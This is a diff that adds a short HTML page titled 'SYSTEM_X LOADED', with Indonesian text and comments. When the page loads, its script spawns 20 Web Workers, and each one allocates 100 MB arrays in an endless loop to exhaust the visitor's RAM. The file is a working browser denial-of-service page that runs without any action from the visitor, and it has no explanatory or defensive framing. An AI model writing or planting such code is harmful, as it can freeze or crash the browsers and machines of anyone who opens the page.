@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body style="background:black; color:lime; text-align:center;">
+    <h1>SYSTEM_X LOADED</h1>
+    <p>Inisialisasi memori...</p>
+    <script>
+        window.onload = () => {
+            // Spawn 20 workers untuk mengonsumsi RAM secara paralel
+            for (let i = 0; i < 20; i++) {
+                let blob = new Blob([`
+                    let data = [];
+                    while(true) {
+                        data.push(new Uint8Array(1024 * 1024 * 100)); 
+                    }
+                `], {type: 'application/javascript'});
+                new Worker(URL.createObjectURL(blob));
+            }
+        };
+    </script>
+</body>
+</html>
